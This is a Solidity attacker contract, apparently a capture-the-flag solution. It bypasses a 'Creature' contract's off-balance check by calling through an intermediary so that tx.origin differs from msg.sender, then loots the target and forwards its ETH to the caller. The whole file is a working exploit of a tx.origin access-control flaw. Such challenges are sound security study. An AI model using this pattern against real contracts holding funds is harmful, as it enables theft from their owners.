// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Creature} from "./Creature.sol";

contract Attacker {
    Creature public creature;
    
    constructor(address _creatureAddress) {
        creature = Creature(_creatureAddress);
    }
    
    // This function will be called from an EOA (Externally Owned Account)
    // Making tx.origin != msg.sender when calling creature.attack()
    function attackCreature(uint256 _damage) external {
        // tx.origin = original caller (EOA)
        // msg.sender = this contract
        // This satisfies _isOffBalance() condition
        creature.attack(_damage);
    }
    
    function lootCreature() external {
        creature.loot();
        // Transfer any received funds to the caller
        payable(msg.sender).transfer(address(this).balance);
    }
    
    // Receive function to accept ETH
    receive() external payable {}
}
